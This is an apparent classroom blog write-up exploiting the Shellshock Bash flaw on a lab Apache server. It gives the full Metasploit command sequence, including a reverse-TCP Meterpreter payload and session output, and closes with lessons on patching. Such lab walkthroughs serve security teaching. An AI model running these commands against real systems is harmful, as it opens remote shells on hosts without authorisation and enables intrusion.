---
title: Unearthing Old Demons - Exploiting the Bash Shellshock Vulnerability 
date: 2025-05-05 
author: Bunleap Sorn
description: A practical walkthrough of identifying and exploiting the notorious Bash Shellshock vulnerability (CVE-2014-6271) using Metasploit, from initial reconnaissance to gaining a Meterpreter shell. 
tags: ["Ethical Hacking", "Cybersecurity", "Classroom Learning", "Shellshock", "Bash", "Vulnerability", "CVE-2014-6271", "Apache", "CGI", "Metasploit", "Reverse Shell", "Meterpreter"]
---
Hello, everyone! While the world of exploits often focuses on the latest zero-days, sometimes the most impactful lessons come from revisiting notorious vulnerabilities that once shook the internet. In a recent exercise, I had the chance to practically explore one such vulnerability: the **Bash Shellshock (CVE-2014-6271)**. This infamous flaw highlighted how deeply a seemingly simple shell vulnerability could impact vast numbers of systems, especially those running web servers.

### The Target: A Vulnerable Web Server

Our task began with reconnaissance, as always. A simple Nmap scan of our target machine (`192.168.65.84`) quickly revealed its network footprint:

![nmap scan](https://i.imgur.com/uDPZsTh.png)

The presence of an Apache web server on Port 80, especially an older version, immediately piqued my interest. Further investigation confirmed that the system was running a Linux kernel and an uptime, suggesting an active, potentially vulnerable host.

### Understanding Shellshock (CVE-2014-6271)

![machine screenshot](https://i.imgur.com/aBOiYA5.png)

The Shellshock vulnerability, discovered in 2014, is a critical flaw in the Bash Unix shell. It allows attackers to execute arbitrary commands by injecting malicious code through specially crafted environment variables. Many web servers, like Apache, use Bash to process CGI (Common Gateway Interface) scripts, making them prime targets for this vulnerability. If a CGI script uses Bash, an attacker could potentially inject commands via HTTP headers, leading to remote code execution.

### Exploitation with Metasploit: A Practical Demonstration

With the target identified and the potential vulnerability in mind, it was time to turn to **Metasploit Framework** to attempt exploitation. The specific module for this scenario was `exploit/multi/http/apache_mod_cgi_bash_env_exec`.

![metaploit config](https://i.imgur.com/iJudBjt.png)

Hereâ€™s the step-by-step process we followed within Metasploit:

1.  **Loading the Exploit Module:**
    ```bash
    msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
    ```
2.  **Setting the Remote Host (Target IP):** We specified the IP address of our vulnerable Apache server.
    ```bash
    msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.65.84
    ```
3.  **Setting the Target URI:** We needed to identify a CGI-enabled path on the web server that would execute a Bash script. In this case, it was `/cgi-bin/status`.
    ```bash
    msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/status
    ```
4.  **Setting the Payload:** Our goal was to establish a reverse shell, so we chose the `linux/x86/meterpreter/reverse_tcp` payload. This payload would instruct the compromised target to connect back to our Kali Linux machine. We also ensured our `LHOST` (attacker IP) and `LPORT` (listening port) were correctly configured for the reverse connection.
    ```bash
    msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
    ```
5.  **Executing the Exploit:**
    ```bash
    msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
    ```

### The Result: A Meterpreter Session

Upon executing the exploit, Metasploit initiated the attack. After a brief wait, the command stager completed, and critically, a **Meterpreter session** was opened\! This meant we had successfully gained interactive command-line access to the vulnerable Linux machine.

```bash
[*] Started reverse TCP handler on 192.168.65.30:4444
[*] Command Stager progress 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 192.168.65.84
meterpreter >
```

Gaining a Meterpreter shell is a significant step in penetration testing, offering powerful capabilities for post-exploitation activities.

![access](https://i.imgur.com/F9wOvYs.png)

### Learning from Shellshock

This hands-on exercise with Shellshock was a powerful demonstration of several key cybersecurity principles:

  * **The Criticality of Patching:** Shellshock was patched years ago, yet this exercise shows that unpatched systems, even if old, remain highly vulnerable. Prompt and consistent patching is non-negotiable.
  * **Web Server Security:** Web servers, especially those running CGI scripts, are often exposed to the internet and can be tempting targets. Proper configuration and regular updates are crucial.
  * **The Power of Metasploit:** Metasploit proved to be an invaluable tool for taking a known vulnerability and reliably demonstrating its exploitation in a controlled environment.

Understanding how an exploit like Shellshock works from the ground up, from identifying the target to gaining a shell, provides invaluable insight into the attacker's perspective, which is essential for building stronger defenses.